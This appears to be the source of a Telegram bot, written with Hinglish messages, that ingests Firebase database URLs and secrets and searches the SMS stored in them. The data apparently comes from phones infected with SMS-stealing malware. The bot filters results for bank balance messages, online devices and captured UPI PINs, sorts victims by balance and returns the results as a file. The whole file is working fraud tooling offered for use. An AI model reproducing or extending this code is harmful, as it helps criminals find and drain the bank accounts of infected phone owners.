#!/usr/bin/env node
import { Telegraf, Input } from 'telegraf';
import { existsSync, mkdirSync, readFileSync, writeFileSync } from 'fs';
import { join } from 'path';
import { parseTxtCredentials, fetchAllPanels } from './lib/panelCore.mjs';
import { parseSearchCommand, runSearch, searchHelpText } from './lib/searchRunner.mjs';
import {
  extractSearchKeywords,
  tierFromRest,
  optsFromWizard,
  statusKeyboard,
  daysKeyboard,
  pinKeyboard,
  sortKeyboard,
  dayLabel,
  statusLabel,
  pinLabel,
} from './lib/searchWizard.mjs';

const TOKEN = process.env.TELEGRAM_BOT_TOKEN;
const DATA_DIR = process.env.BOT_DATA_DIR || join(process.cwd(), '.bot-data');
const PANELS_FILE = join(DATA_DIR, 'panels.json');
const USER_PANELS = new Map();
const SEARCH_ABORT = new Map();
const SEARCH_WIZARD = new Map();

if (!TOKEN) {
  console.error('TELEGRAM_BOT_TOKEN missing. See BOT-START-HI.md');
  process.exit(1);
}

if (!existsSync(DATA_DIR)) mkdirSync(DATA_DIR, { recursive: true });

function loadSavedPanels() {
  if (existsSync(PANELS_FILE)) {
    try {
      return JSON.parse(readFileSync(PANELS_FILE, 'utf8'));
    } catch {
      return [];
    }
  }
  return [];
}

function savePanels(panels) {
  writeFileSync(PANELS_FILE, JSON.stringify(panels, null, 2));
}

let globalPanels = loadSavedPanels();

const bot = new Telegraf(TOKEN);

bot.start(ctx => {
  ctx.reply(
    '✅ Already authorized!\n\n' +
      '📩 .txt + caption `addtxt` / `/fb`\n' +
      '🔎 `/search` — menu\n' +
      '⚡ `/search avl/bal, bank online` → tap options\n' +
      '/status · /done',
    { parse_mode: 'Markdown' }
  );
});

bot.command('status', ctx => {
  const cached = USER_PANELS.get(ctx.from.id);
  const withKey = globalPanels.filter(p => p.key).length;
  ctx.reply(
    `Total panels (A–Z): *${globalPanels.length}*\n` +
      `Auth key wale: ${withKey} | Sirf URL: ${globalPanels.length - withKey}\n` +
      `Last search devices: ${cached?.devices?.length ?? 0}`,
    { parse_mode: 'Markdown' }
  );
});

bot.command('add', async ctx => {
  const text = ctx.message.text.replace(/^\/add\s*/i, '').trim();
  const parts = text.split(/[|,]/);
  if (parts.length < 2) {
    return ctx.reply('Format: /add https://xxx.firebaseio.com|secret');
  }
  const found = parseTxtCredentials(`${parts[0]}\n${parts[1]}`);
  if (!found.length) return ctx.reply('URL/key invalid.');
  const before = globalPanels.length;
  const map = new Map(globalPanels.map(p => [p.url.toLowerCase(), p]));
  for (const p of found) map.set(p.url.toLowerCase(), p);
  globalPanels = [...map.values()];
  savePanels(globalPanels);
  ctx.reply(`✅ ${globalPanels.length - before} naye (total: ${globalPanels.length})`);
});

bot.on('document', async ctx => {
  const cap = (ctx.message.caption || '').toLowerCase();
  if (!cap.includes('addtxt') && !cap.includes('/fb') && cap !== 'fb') {
    return ctx.reply('Caption: `addtxt` ya `/fb`', { parse_mode: 'Markdown' });
  }
  try {
    const link = await ctx.telegram.getFileLink(ctx.message.document.file_id);
    const res = await fetch(link.href);
    const text = await res.text();
    const found = parseTxtCredentials(text);
    if (!found.length) return ctx.reply('File mein Firebase nahi mila.');
    const before = globalPanels.length;
    const map = new Map(globalPanels.map(p => [p.url.toLowerCase(), p]));
    for (const p of found) map.set(p.url.toLowerCase(), p);
    globalPanels = [...map.values()];
    savePanels(globalPanels);
    ctx.reply(
      `📂 ${found.length} firebases · ${globalPanels.length - before} naye\nTotal: *${globalPanels.length}*`,
      { parse_mode: 'Markdown' }
    );
  } catch (e) {
    ctx.reply('File fail: ' + e.message);
  }
});

function startSearchWizard(ctx, rest, isBankHigh = false) {
  const keywords = extractSearchKeywords(rest);
  SEARCH_WIZARD.set(ctx.from.id, {
    keywords,
    tier: tierFromRest(rest, isBankHigh),
    status: null,
    days: null,
    pin: null,
    sort: null,
  });
  const kw = keywords.join(', ');
  return ctx.reply(
    `🔎 Search setup\n📌 Keywords: *${kw}*\n\n*Step 1/4* — Device status choose karo:`,
    { parse_mode: 'Markdown', ...statusKeyboard() }
  );
}

async function executeSearch(ctx, opts) {
  if (!globalPanels.length) {
    return ctx.reply('Pehle `addtxt` se panels add karo.', { parse_mode: 'Markdown' });
  }
  const uid = ctx.from.id;
  if (SEARCH_ABORT.get(uid) === 'running') {
    return ctx.reply('Pehle /done bhejo ya wait karo.');
  }
  SEARCH_ABORT.set(uid, 'running');
  const kw = (opts.keywords || ['avl/bal', 'bank']).join(', ');
  const status = await ctx.reply(`⚡ Search start...\n📌 ${kw}`);

  const abort = () => SEARCH_ABORT.get(uid) !== 'running';
  try {
    const out = await runSearch(globalPanels, opts, prog => {
      if (abort()) return;
      let msg = '⚡ Search...';
      if (prog.phase === 'panels') {
        msg = `📥 DBs ${prog.done}/${prog.total} · ${prog.count} devices`;
      } else if (prog.phase === 'sms') {
        msg = `📌 SMS ${prog.done}/${prog.total} · matched ${prog.matched}`;
      }
      ctx.telegram.editMessageText(ctx.chat.id, status.message_id, undefined, msg).catch(() => {});
    });

    if (abort()) {
      SEARCH_ABORT.delete(uid);
      return;
    }

    const pinLbl = opts.pinBoth ? '🔄 Both (mix)' : opts.pinOnly ? '✅ With PIN' : '❌ Without PIN';
    const onlineLbl = opts.bothStatus ? '🔄 Both' : opts.online ? '🟢 Online' : '⚫ Offline';
    const sortLbl = out.tier.label.includes('LOW->HIGH') ? '💰 Low→High' : '💰 High→Low';
    const dayLbl = opts.days === 0 ? 'All time' : `Last ${opts.days} days`;

    const fname = `sms_avlbal_bank_${Date.now()}.txt`;
    await ctx.replyWithDocument(Input.fromBuffer(Buffer.from(out.text, 'utf8'), fname));

    await ctx.telegram.editMessageText(
      ctx.chat.id,
      status.message_id,
      undefined,
      `✅ Done! ${kw} | ${onlineLbl} | ${pinLbl} | ${sortLbl} | ${dayLbl}\n` +
        `📊 ${out.stats.sms} matches in ${(out.elapsed / 1000).toFixed(0)}s\n` +
        '📄 File sent above ☝️'
    );

    USER_PANELS.set(uid, { devices: out.results, at: Date.now(), search: opts });
    SEARCH_WIZARD.delete(uid);
  } catch (e) {
    await ctx.telegram
      .editMessageText(ctx.chat.id, status.message_id, undefined, '❌ ' + e.message)
      .catch(() => {});
  } finally {
    SEARCH_ABORT.delete(uid);
  }
}

bot.command('search', async ctx => {
  const text = ctx.message.text.trim();
  const rest = text.replace(/^\/search\s*/i, '').trim();
  if (!rest) {
    return ctx.reply(searchHelpText(), { parse_mode: 'Markdown' });
  }
  if (/\bnow\b/i.test(rest)) {
    return executeSearch(ctx, parseSearchCommand(text));
  }
  await startSearchWizard(ctx, rest, false);
});

bot.command('searchbank', async ctx => {
  const text = ctx.message.text.trim();
  const rest = text.replace(/^\/searchbank\s*/i, '').trim();
  if (!rest) {
    return ctx.reply('🏦 `/searchbank bank online` → tap steps', { parse_mode: 'Markdown' });
  }
  if (/\bnow\b/i.test(rest)) {
    return executeSearch(ctx, parseSearchCommand(text));
  }
  await startSearchWizard(ctx, rest || 'bank', true);
});

bot.action(/^sw\|st\|(online|offline|both)$/, async ctx => {
  await ctx.answerCbQuery();
  const w = SEARCH_WIZARD.get(ctx.from.id);
  if (!w) {
    return ctx.reply('Pehle `/search avl/bal, bank online` bhejo', { parse_mode: 'Markdown' });
  }
  w.status = ctx.match[1];
  SEARCH_WIZARD.set(ctx.from.id, w);
  await ctx.reply(
    `✅ ${statusLabel(w.status)}\n\n*Step 2/4* — Kitne din purane SMS?`,
    { parse_mode: 'Markdown', ...daysKeyboard() }
  );
});

bot.action(/^sw\|day\|(\d+)$/, async ctx => {
  await ctx.answerCbQuery();
  const w = SEARCH_WIZARD.get(ctx.from.id);
  if (!w?.status) return ctx.reply('Pehle Step 1 (Online/Offline) choose karo.');
  w.days = parseInt(ctx.match[1], 10);
  SEARCH_WIZARD.set(ctx.from.id, w);
  await ctx.reply(
    `✅ ${dayLabel(w.days)}\n\n*Step 3/4* — UPI PIN filter:`,
    { parse_mode: 'Markdown', ...pinKeyboard() }
  );
});

bot.action(/^sw\|pin\|(with|without|both)$/, async ctx => {
  await ctx.answerCbQuery();
  const w = SEARCH_WIZARD.get(ctx.from.id);
  if (!w?.status || w.days === null || w.days === undefined) {
    return ctx.reply('Pehle days choose karo.');
  }
  w.pin = ctx.match[1];
  SEARCH_WIZARD.set(ctx.from.id, w);
  await ctx.reply(
    `✅ PIN: ${pinLabel(w.pin)}\n\n*Step 4/4* — Sort + Start:`,
    { parse_mode: 'Markdown', ...sortKeyboard() }
  );
});

bot.action(/^sw\|sort\|(low|high)$/, async ctx => {
  await ctx.answerCbQuery();
  const w = SEARCH_WIZARD.get(ctx.from.id);
  if (!w?.pin) return ctx.reply('Pehle PIN step complete karo.');
  w.sort = ctx.match[1];
  if (w.sort === 'high') w.tier = w.tier === 'bank70k' ? 'bank70k' : 'high_low';
  else w.tier = 'low_high';
  SEARCH_WIZARD.set(ctx.from.id, w);
  const kw = w.keywords.join(', ');
  await ctx.reply(
    `Sort: ${w.sort === 'low' ? 'Low→High' : 'High→Low'}\n\n` +
      `📋 ${kw} | ${statusLabel(w.status)} | ${dayLabel(w.days)} | ${pinLabel(w.pin)}\n` +
      'Neeche *START SEARCH* dabao 👇',
    { parse_mode: 'Markdown', ...sortKeyboard() }
  );
});

bot.action(/^sw\|go\|start$/, async ctx => {
  await ctx.answerCbQuery('Search start...');
  const w = SEARCH_WIZARD.get(ctx.from.id);
  if (!w?.status || w.days === null || w.days === undefined || !w.pin) {
    return ctx.reply('Poora wizard complete karo (status → days → PIN).');
  }
  if (w.sort === 'high' && w.tier !== 'bank70k') w.tier = 'high_low';
  if (!w.sort) w.tier = w.tier || 'low_high';
  await executeSearch(ctx, optsFromWizard(w));
});

bot.command('fb', ctx => {
  ctx.reply(`📩 .txt + \`fb\` caption · Panels: ${globalPanels.length}`, { parse_mode: 'Markdown' });
});

bot.command('done', ctx => {
  SEARCH_ABORT.delete(ctx.from.id);
  SEARCH_WIZARD.delete(ctx.from.id);
  ctx.reply(`✅ Panels: ${globalPanels.length}\n/search se wizard start karo.`);
});

bot.command('fetch', async ctx => {
  if (!globalPanels.length) return ctx.reply('Pehle addtxt.');
  const uid = ctx.from.id;
  const status = await ctx.reply(`⚡ Fetch ${globalPanels.length} panels...`);
  try {
    const devices = await fetchAllPanels(globalPanels, {
      batch: 35,
      onProgress(done, total, count) {
        if (done % 25 === 0 || done === total) {
          ctx.telegram
            .editMessageText(ctx.chat.id, status.message_id, undefined, `${done}/${total} · ${count} devices`)
            .catch(() => {});
        }
      },
    });
    USER_PANELS.set(uid, { devices, at: Date.now() });
    const on = devices.filter(d => d.status).length;
    await ctx.telegram.editMessageText(
      ctx.chat.id,
      status.message_id,
      undefined,
      `✅ ${devices.length} devices | ${on} online`
    );
  } catch (e) {
    await ctx.telegram.editMessageText(ctx.chat.id, status.message_id, undefined, e.message);
  }
});

bot.command('online', ctx => {
  const cached = USER_PANELS.get(ctx.from.id);
  if (!cached?.devices?.length) return ctx.reply('Pehle /search.');
  const online = cached.devices.filter(d => d.status);
  ctx.reply(`Online: ${online.length}`);
});

bot.launch();
console.log('Panel search bot (wizard) polling...');

process.once('SIGINT', () => bot.stop('SIGINT'));
process.once('SIGTERM', () => bot.stop('SIGTERM'));
